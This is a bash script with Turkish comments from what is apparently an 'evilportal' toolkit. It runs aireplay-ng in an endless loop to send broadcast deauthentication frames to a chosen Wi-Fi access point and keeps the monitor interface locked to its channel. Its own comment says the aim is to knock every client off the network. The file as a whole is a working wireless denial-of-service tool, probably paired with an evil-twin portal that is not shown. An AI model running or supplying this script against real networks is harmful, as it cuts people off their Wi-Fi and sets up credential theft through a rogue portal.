#!/usr/bin/env bash
# ==============================================================
#  evilportal — hedef AP'ye sürekli deauth
#  Kullanım: sudo ./deauth.sh [monitor_iface]
# ==============================================================
set -uo pipefail

BASE="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "$BASE/config.sh"

MON_IF="${1:-$MON_IF}"

[[ $EUID -eq 0 ]] || { echo "root gerekli"; exit 1; }
command -v aireplay-ng >/dev/null || { echo "aireplay-ng yok"; exit 1; }

[[ "$TARGET_BSSID" =~ ^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$ ]] || {
  echo "geçersiz BSSID: '$TARGET_BSSID'"; exit 1
}
[[ "$CHANNEL" =~ ^[0-9]+$ ]] || { echo "geçersiz kanal: '$CHANNEL'"; exit 1; }
iw dev "$MON_IF" info >/dev/null 2>&1 || { echo "arayüz yok: $MON_IF"; exit 1; }

iw dev "$MON_IF" set channel "$CHANNEL" 2>/dev/null

echo "[*] deauth → $TARGET_BSSID  ($MON_IF, ch $CHANNEL)"

n=0
while :; do
  # 10 sn'de bir kanalı geri kilitle (kart başka kanala atlarsa deauth kör kalır)
  (( n++ % 10 == 0 )) && iw dev "$MON_IF" set channel "$CHANNEL" >/dev/null 2>&1
  # Broadcast deauth: AP'nin tüm istemcilerini düşürür
  aireplay-ng --deauth 10 -a "$TARGET_BSSID" "$MON_IF" >/dev/null 2>&1
  sleep 1
done
